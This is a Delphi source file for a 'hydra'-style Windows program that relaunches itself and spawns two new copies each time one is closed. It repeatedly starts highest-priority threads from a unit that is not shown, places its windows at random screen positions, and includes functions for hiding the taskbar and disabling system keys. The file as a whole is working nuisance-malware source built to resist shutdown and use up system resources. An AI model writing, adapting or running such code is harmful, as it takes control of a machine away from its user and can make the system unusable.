unit hydra_u;

interface

uses
  Windows, Messages, SysUtils, Variants, Classes, Graphics, Controls, Forms,
  Dialogs, ExtCtrls, StdCtrls, hydra_threads, TlHelp32, PsAPI,  ShellApi,
  jpeg;

type
  TForm1 = class(TForm)
    Timer1: TTimer;
    Image1: TImage;
    Label1: TLabel;
    procedure Timer1Timer(Sender: TObject);
    procedure FormCreate(Sender: TObject);
    procedure Timer2Timer(Sender: TObject);
  private
    num_apps : integer;
    procedure ShowTaskBar(bShow: Boolean);
    procedure EnableTaskBar(bShow: Boolean);
    procedure SystemKeys(Disable: Boolean);
    function GetPathFromPID(const PID: cardinal): string;
    function ProcessCount(const AFullFileName: string): Integer;
    { Private declarations }
  public
    { Public declarations }
  end;

var
  Form1: TForm1;

implementation

{$R *.dfm}

procedure TForm1.Timer1Timer(Sender: TObject);
var
  thread : HydraThread;
begin
  thread := HydraThread.Create(true);
  try
    thread.FreeOnTerminate := true;
    thread.Priority := tpHighest;
  finally
    thread.Resume;
  end;
end;

procedure TForm1.FormCreate(Sender: TObject);
begin
  if ProcessCount(Application.ExeName) = 1 then
  begin
    ShellExecute(Handle, 'open', PChar(Application.ExeName), nil, nil, SW_SHOWNORMAL);
    num_apps := 1;
  end
  else
  begin
    num_apps := ProcessCount(Application.ExeName);
  end;
  randomize;
  form1.Top := random(Screen.DesktopHeight - form1.Height);
  form1.Left := random(Screen.DesktopWidth - form1.Width);
  ShowWindow(Application.Handle, SW_HIDE) ;
  SetWindowLong(Application.Handle, GWL_EXSTYLE, GetWindowLong(Application.Handle, GWL_EXSTYLE) or WS_EX_TOOLWINDOW ) ;
  ShowWindow(Application.Handle, SW_SHOW) ;
  ShowTaskBar(True);
  EnableTaskBar(True);
  SystemKeys(False);
end;

procedure TForm1.ShowTaskBar(bShow: Boolean);
begin
 if bShow = True then
 ShowWindow(FindWindow('Shell_TrayWnd', nil), SW_SHOWNA)
else
 ShowWindow(FindWindow('Shell_TrayWnd', nil), SW_HIDE) ;
end;

procedure TForm1.EnableTaskBar(bShow: Boolean);
begin
   if bShow = True then
   EnableWindow(FindWindow('Shell_TrayWnd', nil), TRUE)
 else
   EnableWindow(FindWindow('Shell_TrayWnd', nil), FALSE) ;
end;

procedure TForm1.SystemKeys(Disable: Boolean);
var
  OldVal : LongInt;
begin
 SystemParametersInfo(SPI_SCREENSAVERRUNNING, Word(Disable), @OldVal, 0) ;
end;

function TForm1.GetPathFromPID(const PID: cardinal): string;
var
  hProcess: THandle;
  path: array[0..MAX_PATH - 1] of char;
begin
  hProcess := OpenProcess(PROCESS_QUERY_INFORMATION or PROCESS_VM_READ, false, PID);
  if hProcess <> 0 then
    try
      if GetModuleFileNameEx(hProcess, 0, path, MAX_PATH) = 0 then
        RaiseLastOSError;
      result := path;
    finally
      CloseHandle(hProcess)
    end
  else
    RaiseLastOSError;
end;

function TForm1.ProcessCount(const AFullFileName: string): Integer;
var
  ContinueLoop: boolean;
  FSnapshotHandle: THandle;
  FProcessEntry32: TProcessEntry32;
begin
  FSnapshotHandle := CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
  FProcessEntry32.dwSize := SizeOf(FProcessEntry32);
  ContinueLoop := Process32First(FSnapshotHandle, FProcessEntry32);
  Result := 0;
  while (ContinueLoop) do
  begin
    if SameText(ExtractFileName(AFullFileName), FProcessEntry32.szExeFile) then
    if ((UpperCase(GetPathFromPID(FProcessEntry32.th32ProcessID)) = UpperCase(AFullFileName)))
    then Result := Result + 1;
    ContinueLoop := Process32Next(FSnapshotHandle, FProcessEntry32);
  end;
  CloseHandle(FSnapshotHandle);
end;

procedure TForm1.Timer2Timer(Sender: TObject);
begin
  if (ProcessCount(Application.ExeName) < num_apps) or (ProcessCount(Application.ExeName) <= 1) then
  begin
    ShellExecute(Handle, 'open', PChar(Application.ExeName), nil, nil, SW_SHOWNORMAL);
    ShellExecute(Handle, 'open', PChar(Application.ExeName), nil, nil, SW_SHOWNORMAL);
  end;
end;

end.
